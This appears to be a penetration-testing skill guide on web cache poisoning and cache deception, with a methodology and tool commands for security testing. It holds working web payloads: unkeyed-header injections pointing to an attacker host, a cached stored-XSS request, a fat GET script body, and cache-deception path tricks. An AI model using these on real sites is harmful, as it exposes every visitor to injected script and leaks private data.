---
name: cache_poisoning
description: Web cache poisoning and cache deception testing covering unkeyed header injection, fat GET, stored XSS via cache, and cache deception attacks
---

# Web Cache Poisoning & Cache Deception

Cache poisoning injects malicious content into a shared cache so it is served to all subsequent users requesting the same resource. Cache deception tricks the cache into storing a victim's private response, which the attacker then retrieves. Both attacks abuse the gap between what the cache treats as the cache key and what the origin server uses to generate the response.

## Attack Surface

**When to Test**
- Any application fronted by a CDN (CloudFront, Cloudflare, Fastly, Akamai, Varnish)
- Reverse proxy setups with `proxy_cache` (Nginx), `cache` (Varnish), Squid
- Applications with `Cache-Control: public` or missing `Cache-Control` on dynamic endpoints
- APIs that reflect header values in responses (redirects, canonical URLs, script src attributes)

**Indicators of Caching**
- `X-Cache: HIT` / `X-Cache: MISS` headers
- `CF-Cache-Status`, `X-Varnish`, `Age:`, `Via:` headers
- Consistent low latency on repeated identical requests (cache hit vs miss timing difference)

## Core Concepts

**Cache Key**: The set of request attributes the cache uses to identify unique responses (typically: method + URL + Host). Headers, cookies, and query params are often NOT in the cache key.

**Unkeyed Input**: A request attribute (header, parameter) that influences the response but is NOT part of the cache key. Injecting malicious values through unkeyed inputs and getting the response cached = cache poisoning.

## Vulnerability Types

### Unkeyed Header Injection

The most common vector. Server reflects an HTTP header value into the response, but the header is not in the cache key.

**Common unkeyed headers to test:**
```
X-Forwarded-Host: evil.attacker.com
X-Host: evil.attacker.com
X-Forwarded-Server: evil.attacker.com
X-Forwarded-Scheme: https
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Port: 443
Forwarded: host=evil.attacker.com
```

**Detection**: Send request with `X-Forwarded-Host: your-collaborator.com` and inspect the response. If the value appears in:
- A redirect location: `Location: https://your-collaborator.com/path`
- A script `src` or link `href` attribute
- A JSON field used for URL construction
→ Unkeyed header injection confirmed.

**Poisoning to Stored XSS** (affects all users):
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(document.cookie)</script>

Response (cached):
<script src="https://evil.com"><script>alert(document.cookie)</script>/cdn/app.js">
```

### Cache Poisoning with Unkeyed Query Parameters

Some caches ignore certain query parameters (analytics params, tracking IDs):
```
/?utm_content=1&x=normal    ← cached as /?x=normal
/?utm_content=<xss>&x=normal ← same cache key, but response contains XSS
```

Use `param-miner` style fuzzing to find unkeyed parameters:
```python
# Test each parameter to find ones that don't affect the cache key
for param in wordlist:
    r1 = get(url + f'?{param}=canary')
    r2 = get(url + f'?{param}=canary')  # second request should HIT cache
    if 'canary' in r2.text and 'X-Cache: HIT' in r2.headers:
        print(f'Unkeyed parameter found: {param}')
```

### Fat GET Poisoning

Some CDNs cache GET requests but pass the body to the origin. If the body is reflected in the response:
```http
GET /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

query=<script>alert(1)</script>
```
Response is cached under the URL (no body in cache key) and served to all users.

### Host Header Injection via Cache

If the `Host` header is partially reflected (e.g., in password reset emails or absolute URLs in responses):
```http
GET / HTTP/1.1
Host: target.com:.attacker.com
```
Some parsers accept this; the value propagates into cached absolute URLs.

### `Vary` Header Absence (CDN Policy Confusion)

If the response varies by `Origin` or `Accept-Language` but the `Vary` header is absent, the cache serves one user's response to a different user:
```http
GET /api/messages HTTP/1.1
Accept-Language: en-US
→ Response (en) cached for all users, French users get English responses
```

More critically — if a response includes session-specific data and `Vary: Cookie` is missing:
```http
GET /api/profile HTTP/1.1
Cookie: session=victim
→ Victim's profile cached and served to unauthenticated users
```

## Cache Deception

Cache deception tricks the cache into storing a victim's private response.

**Mechanism**: Many caches use file extension to decide what to cache regardless of `Cache-Control`. If `GET /account/profile.css` returns the same HTML as `GET /account/profile`:

1. Attacker sends victim a link: `https://target.com/account/profile.css`
2. Victim navigates to it (authenticated) — server returns profile HTML (ignoring `.css` extension)
3. CDN caches it (sees `.css` extension → static asset → cache it)
4. Attacker requests `https://target.com/account/profile.css` — receives victim's cached profile

**Path confusion variants:**
```
/account/profile%0d%0a.css      ← CRLF before extension
/account/profile.css            ← extension appended
/account/profile;.css           ← semicolon delimiter
/account/profile#.css           ← fragment (some implementations)
```

## Bypass Techniques

**Cache Buster**
Always use a unique cache-busting parameter when testing to avoid poisoning production:
```
/?cb=<random_id>&X-Forwarded-Host: attacker.com
```
Test with cache buster first — only remove it to demonstrate actual poisoning after confirming the vector.

**Vary: Origin Absence for CORS Poisoning**
Without `Vary: Origin`, the CORS response for one origin is cached and served to all origins.

## Tools

- **ffuf** — Header fuzzing for unkeyed inputs: `ffuf -u https://target.com/ -H "FUZZ: canary" -w headers-wordlist.txt -fr "canary"`
- **nuclei** — Cache poisoning templates: `nuclei -t nuclei-templates/vulnerabilities/cache-poisoning/`
- **Python requests** — Custom cache key testing and response comparison
- **Caido** — Observe caching headers in all responses; test header reflection in Repeater
- **param-miner** approach — Automate unkeyed parameter discovery via Python

## Testing Methodology

1. Confirm caching infrastructure via response headers (`X-Cache`, `Age`, `CF-Cache-Status`, `Via`)
2. Identify cacheable responses: static-looking paths, responses with `Cache-Control: public` or no `Cache-Control`
3. Test each unkeyed header (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Scheme`) with a unique canary value; check if reflected in response
4. Send second request without the header; check if canary value still appears → cached = poisoning confirmed
5. Test fat GET: send GET request with body containing canary; check if reflected and cached
6. Test cache deception: append `.css`/`.js`/`.png` to authenticated endpoints; send link to victim-simulated request; retrieve as unauthenticated
7. Test unkeyed query parameters by fuzzing parameter names with canary values
8. When vector confirmed: replace canary with XSS payload, request with cache buster removed, verify cached response contains payload
9. Document: vulnerable header/parameter, cache key configuration, affected URLs, full PoC

## Pro Tips

- Always test with a unique cache buster (`?cb=<uuid>`) first — never poison the real cache before you have a confirmed vector
- `X-Forwarded-Host` injection into JavaScript `src` attributes is the highest-impact vector — a single cached poisoned response affects every user who loads the page
- Cache deception is often overlooked on SPAs because the router handles navigation client-side — but the server-side path still matters to the CDN
- The `Age:` header tells you how old the cached response is — if it increments on repeat requests, the response is being served from cache
- Check for `Vary: Origin` absence on CORS-enabled APIs — missing Vary combined with credentialed CORS is a stored-XSS-equivalent through the cache
